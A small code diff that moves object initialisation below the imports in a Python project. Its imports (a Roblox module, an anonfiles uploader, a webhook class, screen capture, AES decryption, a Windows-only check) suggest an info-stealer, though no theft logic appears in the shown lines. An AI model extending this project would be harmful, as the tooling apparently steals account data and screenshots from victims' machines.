@@ -8,10 +8,6 @@ from config import Config
 from _roblox import RobloxX
 from anonFile import uploadToAnonfiles
 
-ii = informations.Info()
-_webh = _webhook.WebhookX()
-cc = Config()
-
 import getpass
 import os
 import random
@@ -35,7 +31,11 @@ from zipfile import ZipFile
 from Crypto.Cipher import AES
 from PIL import ImageGrab
 import platform
-import ctypes    
+import ctypes   
+
+ii = informations.Info()
+_webh = _webhook.WebhookX()
+cc = Config() 
 
 if platform.system() != "Windows":
     exit()
